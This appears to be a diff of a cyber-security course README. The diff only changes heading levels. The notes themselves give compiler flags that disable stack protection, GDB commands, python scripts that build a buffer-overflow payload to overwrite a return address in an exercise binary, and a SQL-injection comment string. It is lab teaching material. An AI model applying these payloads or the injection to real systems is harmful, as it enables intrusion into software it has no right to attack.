@@ -1,6 +1,6 @@
-## UNIMORE-cyber-security
+# UNIMORE-cyber-security
 
-# Buffer Overflow
+## Buffer Overflow
 ```commandline
 gcc -w -m32 -fno-stack-protector -fno-pic -no-pie -g -o
 ```
@@ -9,20 +9,20 @@ gcc -w -m32 -fno-stack-protector -fno-pic -no-pie -g -o
 python3 -c 'print("A"*number)' | ./esercizio1
 ```
 
-# GDB
+### GDB
 ```commandline
 $ gdb esercizio1
 (gdb) disassamble main
 ```
 
-# BE AWARE!!
+### BE AWARE!!
 ```commandline
 mov (or movb, movl, movw, movq)
 lea
 cmpl
 ```
 
-# python2
+### python2
 ```python
 a = ""
 for _ in range(10):
@@ -30,7 +30,7 @@ for _ in range(10):
 print(a + '\x6b\x84\x04\x08')
 ```
 
-# python3
+### python3
 ```python
 import sys
 
@@ -39,7 +39,7 @@ payload = b"A" * length + b'\x6b\x84\x04\x08'
 sys.stdout.buffer.write(payload)
 ```
 
-# SQL Injection
+## SQL Injection
 ```commandline
 '--
 ```
